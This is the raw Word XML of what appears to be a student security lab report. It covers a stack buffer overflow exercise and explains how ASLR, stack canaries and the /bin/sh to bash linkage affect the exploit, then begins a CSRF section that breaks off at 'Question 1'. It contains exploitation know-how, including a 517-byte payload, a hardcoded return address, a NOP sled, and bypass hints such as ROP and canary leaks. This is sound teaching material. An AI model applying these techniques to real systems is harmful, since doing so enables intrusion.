    <w:p w14:paraId="71FFAF71" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="78FA7F2E" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576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7E438063" wp14:editId="7EA1495A">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>933450</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>237827</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5866800" cy="334708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8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DEEBD" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:sectPr w:rsidR="005A4576" w:rsidSect="005A4576">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="1380" w:right="1080" w:bottom="280" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0EEC9936" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A457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87F769" wp14:editId="572B3868">
            <wp:extent cx="5875042" cy="380371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042" cy="38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6A36" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576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2336" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="301FCFA4" wp14:editId="4F6D8298">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>933450</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>129924</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5884163" cy="3771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D58EF" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="15"/>
        </w:rPr>
        <w:sectPr w:rsidR="005A4576" w:rsidSect="005A4576">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="1460" w:right="1080" w:bottom="280" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56498EF5" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A457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37EE04" wp14:editId="77B2DF66">
            <wp:extent cx="5987409" cy="39052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409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771" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="220"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Analysis of Each </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>Protection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="573BFD1B" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:spacing w:before="204" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:contextualSpacing w:val="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">/bin/bash </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Linkage</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3369D398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204" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:contextualSpacing w:val="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Effect</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>: This does not act as a protection against the exploit. Linking /bin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>sh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to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DE73F70" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:before="43"/>
        <w:ind w:left="1440"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">/bin/bash ensures the shellcode executes a root-capable shell under </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>setuid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t>as</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B79A7FF" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:before="44" w:line="278" w:lineRule="auto"/>
        <w:ind w:left="1440" w:right="879"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>/bin/bash</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>respects</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>setuid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>privileges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/bin/dash</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>(default)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5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The exploit succeeds because the shellcode (/bin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>) runs unimpeded.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="752EA24C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159" w:after="0" w:line="278" w:lineRule="auto"/>
        <w:ind w:right="399"/>
        <w:contextualSpacing w:val="0"/>
        <w:jc w:val="both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Success/Failure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succeeds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mechanism</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>is absent—bash’s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setuid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shell</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5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preventing</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>it.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>This is a configuration choice, not a security feature.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19153473" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="720"/>
          <w:tab w:val="num" w:pos="1080"/>
        </w:tabs>
        <w:ind w:left="1080"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Address</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Randomization</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t xml:space="preserve"> (ASLR)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D89D68C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203" w:after="0" w:line="278" w:lineRule="auto"/>
        <w:ind w:right="593"/>
        <w:contextualSpacing w:val="0"/>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Effect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ASLR</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>randomizes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0xffffccc4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value per run), making the fixed </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ret_addr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (e.g., 0xffffcd14) invalid. The exploit fails as EIP lands in an unpredictable location.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BF8B099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159" w:after="0" w:line="278" w:lineRule="auto"/>
        <w:ind w:right="497"/>
        <w:contextualSpacing w:val="0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Success/Failure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5"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr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hardcoded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no longer points to the NOP sled. ASLR effectively mitigates this type of buffer overflow by introducing randomness, requiring more advanced techniques (e.g., NOP sled brute force or ROP) to bypass.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E9B9B19" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="278" w:lineRule="auto"/>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:sectPr w:rsidR="005A4576" w:rsidSect="005A4576">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="1460" w:right="1080" w:bottom="280" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1299ECCB" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="720"/>
          <w:tab w:val="num" w:pos="1080"/>
        </w:tabs>
        <w:spacing w:before="60"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Stack Guard </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>(Canary)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="361DF200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203" w:after="0" w:line="278" w:lineRule="auto"/>
        <w:ind w:right="572"/>
        <w:contextualSpacing w:val="0"/>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Effect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canary</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>(a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buffer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EIP)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>is overwritten by the 517-byte payload, triggering a stack smash detection and program termination before the shellcode executes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35D9C411" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="1440"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:spacing w:before="159" w:after="0" w:line="278" w:lineRule="auto"/>
        <w:ind w:right="454"/>
        <w:contextualSpacing w:val="0"/>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Why Success/Failure</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>: The exploit fails because the canary detects the overflow, aborting execution. This protection is highly effective against simple buffer overflows,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attacker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guess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bypass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canary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via information leakage), which is impractical without additional vulnerabilities.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="026A612F" w14:textId="77777777" w:rsidR="005A4576" w:rsidRPr="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576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sz w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20B9059B" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576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C35DE6" w14:paraId="018502B6" w14:textId="77777777" w:rsidTr="000E6622">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3236" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5B853172" w14:textId="4706231A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b/>
                <w:bCs/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-AU"/>
              </w:rPr>
              <w:t>Mitigation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3237" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1FC6D92D" w14:textId="169E169C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b/>
                <w:bCs/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-AU"/>
              </w:rPr>
              <w:t>Strength</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3237" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2A86695E" w14:textId="7A34AB37" w:rsidR="00C35DE6" w:rsidRDefault="00C35DE6" w:rsidP="00C35DE6">
            <w:pPr>
              <w:tabs>
                <w:tab w:val="left" w:pos="1044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AU"/>
              </w:rPr>
              <w:t>Difficulty to Bypass</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C35DE6" w14:paraId="6FF6C26D" w14:textId="77777777" w:rsidTr="00C35DE6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3236" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="66C59F23" w14:textId="1CD2AFD9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>ASLR (Address Space Layout Randomization)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4676E333" w14:textId="10EF72C8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Strong </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-AU"/>
              </w:rPr>
              <w:t>as</w:t>
            </w:r>
            <w:r w:rsidRPr="00C35DE6">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-AU"/>
              </w:rPr>
              <w:t xml:space="preserve"> greatly reduces predictable addresses</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="59F6E688" w14:textId="0EA5A6C5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High </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-AU"/>
              </w:rPr>
              <w:t xml:space="preserve">as </w:t>
            </w:r>
            <w:r w:rsidRPr="00C35DE6">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-AU"/>
              </w:rPr>
              <w:t>typically requires an information</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-AU"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00C35DE6">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-AU"/>
              </w:rPr>
              <w:t>leak to defeat</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C35DE6" w14:paraId="1640CF72" w14:textId="77777777" w:rsidTr="000C0EE7">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3236" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="688DB353" w14:textId="70A982A7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>Stack canary</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1F256E5E" w14:textId="1816ACBD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Strong </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-AU"/>
              </w:rPr>
              <w:t>as</w:t>
            </w:r>
            <w:r w:rsidRPr="00C35DE6">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-AU"/>
              </w:rPr>
              <w:t xml:space="preserve"> detects/blocks stack-smashing attempts</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7A07BF3F" w14:textId="2B4A3E14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High </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-AU"/>
              </w:rPr>
              <w:t>as</w:t>
            </w:r>
            <w:r w:rsidRPr="00C35DE6">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-AU"/>
              </w:rPr>
              <w:t xml:space="preserve"> requires leaking the canary value to bypass</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C35DE6" w14:paraId="7F4EDDCC" w14:textId="77777777" w:rsidTr="00C35DE6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3236" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4F63101F" w14:textId="30E2EB93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>/bin/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00C35DE6">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-AU"/>
              </w:rPr>
              <w:t>sh</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00C35DE6">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-AU"/>
              </w:rPr>
              <w:t xml:space="preserve"> → /bin/bash linkage</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="266E4895" w14:textId="4E4EDB62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Moderate </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-AU"/>
              </w:rPr>
              <w:t xml:space="preserve">as </w:t>
            </w:r>
            <w:r w:rsidRPr="00C35DE6">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-AU"/>
              </w:rPr>
              <w:t xml:space="preserve">changes shell </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00C35DE6">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-AU"/>
              </w:rPr>
              <w:t>behavior</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00C35DE6">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-AU"/>
              </w:rPr>
              <w:t>, limiting some exploits</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5811A30F" w14:textId="77777777" w:rsidR="00C35DE6" w:rsidRDefault="00C35DE6" w:rsidP="00C35DE6">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-AU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Low </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-AU"/>
              </w:rPr>
              <w:t>as</w:t>
            </w:r>
            <w:r w:rsidRPr="00C35DE6">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-AU"/>
              </w:rPr>
              <w:t xml:space="preserve"> can be worked around by invoking a</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6FE3555E" w14:textId="37A95DEE" w:rsidR="00C35DE6" w:rsidRDefault="00C35DE6" w:rsidP="00C35DE6">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C35DE6">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-AU"/>
              </w:rPr>
              <w:t xml:space="preserve">different shell (e.g., dash or </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00C35DE6">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-AU"/>
              </w:rPr>
              <w:t>sh</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00C35DE6">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-AU"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2D26395A" w14:textId="77777777" w:rsidR="00C35DE6" w:rsidRPr="005A4576" w:rsidRDefault="00C35DE6" w:rsidP="005A4576">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="241FFF18" w14:textId="61FCB108" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A45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---------------------------------------End of Part 1--------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CAC7FE8" w14:textId="77777777" w:rsidR="00C35DE6" w:rsidRDefault="00C35DE6" w:rsidP="00C35DE6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7EA25AD7" w14:textId="77777777" w:rsidR="00C35DE6" w:rsidRDefault="00C35DE6" w:rsidP="00C35DE6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D9BCEA9" w14:textId="77777777" w:rsidR="00C35DE6" w:rsidRDefault="00C35DE6" w:rsidP="00C35DE6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="16BA3843" w14:textId="77777777" w:rsidR="00C35DE6" w:rsidRDefault="00C35DE6" w:rsidP="00C35DE6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="700A6D93" w14:textId="77777777" w:rsidR="00C35DE6" w:rsidRDefault="00C35DE6" w:rsidP="00C35DE6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26CCC064" w14:textId="77777777" w:rsidR="00C35DE6" w:rsidRDefault="00C35DE6" w:rsidP="00C35DE6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="734945E4" w14:textId="77777777" w:rsidR="00C35DE6" w:rsidRDefault="00C35DE6" w:rsidP="00C35DE6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F871936" w14:textId="77777777" w:rsidR="00C35DE6" w:rsidRDefault="00C35DE6" w:rsidP="00C35DE6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="29E7E7F1" w14:textId="433159D6" w:rsidR="00B7167B" w:rsidRPr="00B7167B" w:rsidRDefault="00B7167B" w:rsidP="00B7167B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</w:t>
      </w:r>
      <w:r w:rsidRPr="00B7167B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Part 2: Cross-Site Request Forgery (CSRF)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D54EACC" w14:textId="77853804" w:rsidR="00B7167B" w:rsidRPr="00B7167B" w:rsidRDefault="00B7167B" w:rsidP="00B7167B">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B7167B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Question 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14674BCF" w14:textId="4F5E7A18" w:rsidR="005A4576" w:rsidRPr="00B7167B" w:rsidRDefault="00B7167B" w:rsidP="00B7167B">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
